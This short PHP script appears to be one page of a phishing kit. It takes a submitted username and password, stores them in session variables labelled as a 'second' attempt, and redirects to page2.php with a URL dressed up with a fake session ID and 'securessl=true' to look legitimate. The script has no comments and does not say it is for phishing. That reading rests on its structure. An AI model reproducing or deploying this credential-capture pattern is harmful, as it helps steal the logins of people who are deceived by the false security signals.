<?php

session_start();

$v_ip = $_SERVER['REMOTE_ADDR'];
$hash = md5($v_ip);

if(!empty($_POST['username']))  {

$_SESSION['username_second'] = $_POST['username'];

}

if(!empty($_POST['password']))  {

$_SESSION['password_second'] = $_POST['password'];

header("Location: page2.php?&sessionid=$hash&securessl=true");

}

?>